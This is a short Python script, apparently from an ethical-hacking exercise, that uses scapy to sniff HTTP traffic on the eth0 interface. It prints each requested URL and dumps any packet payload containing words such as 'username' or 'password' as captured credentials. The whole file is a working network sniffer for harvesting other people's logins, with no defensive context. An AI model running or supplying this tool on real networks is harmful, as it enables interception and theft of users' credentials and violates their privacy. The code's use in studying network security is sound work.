#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_info(packet):
    if packet.haslayer(scapy.Raw):
        statement = packet[scapy.Raw].load
        credentials = ["username", "user", "login", "uname", "password", "pass"]
        for word in credentials:
            if word in statement:
                return statement


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request :" + url)
        info = get_info(packet)
        if info:
            print("\n\n[+] Credentials: " + info + "\n\n")


sniff("eth0")
